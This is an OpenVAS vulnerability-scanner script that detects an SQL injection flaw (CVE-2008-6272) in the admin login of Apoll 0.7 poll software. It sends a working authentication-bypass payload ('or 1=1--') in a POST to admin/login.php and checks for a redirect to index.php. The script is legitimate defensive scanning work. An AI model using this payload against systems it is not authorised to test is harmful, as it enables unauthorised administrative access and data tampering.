###############################################################################
# OpenVAS Vulnerability Test
# $Id: apoll_7_0_sql_injection.nasl 7170 2017-09-18 10:35:33Z cfischer $
#
# Dragan Mitic Apoll 'admin/index.php' SQL Injection Vulnerability
#
# Authors:
# Michael Meyer
#
# Copyright:
# Copyright (c) 2009 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.100022");
 script_version("$Revision: 7170 $");
 script_tag(name:"last_modification", value:"$Date: 2017-09-18 12:35:33 +0200 (Mon, 18 Sep 2017) $");
 script_tag(name:"creation_date", value:"2009-03-10 08:40:52 +0100 (Tue, 10 Mar 2009)");
 script_bugtraq_id(32079);
 script_cve_id("CVE-2008-6272");
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

 script_name("Dragan Mitic Apoll 'admin/index.php' SQL Injection Vulnerability");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_tag(name : "solution" , value : "Upgrade to newer Version if available at http://www.miticdjd.com/index/scripts/apoll/.");
 script_tag(name : "summary" , value : "Dragan Mitic Apoll is prone to an SQL-injection vulnerability because it
 fails to sufficiently sanitize user-supplied data before using it in an SQL query.");
 script_tag(name : "impact" , value : "Exploiting this issue could allow an attacker to compromise the application,
 access or modify data, or exploit latent vulnerabilities in the underlying database.");
 script_tag(name : "affected" , value : "Dragan Mitic Apoll 0.7 is vulnerable; other versions may also be affected.");

 script_tag(name:"qod_type", value:"remote_app");

 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if(!can_host_php(port:port))exit(0);

host = http_host_name( port:port );

foreach dir( make_list_unique( "/apoll", "/poll", cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";

  variables = string("username=select username from ap_users' or ' 1=1'-- '&password=x");
  url = string(dir + "/admin/login.php");

  req = string(
    "POST ", url, " HTTP/1.0\r\n", 
    "Referer: ","http://", host, url, "\r\n",
    "Host: ", host, "\r\n", 
    "Content-Type: application/x-www-form-urlencoded\r\n", 
    "Content-Length: ", strlen(variables), 
    "\r\n\r\n", 
    variables);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

  if( egrep(pattern: "Location: index.php", string: res) ) {
    report = report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
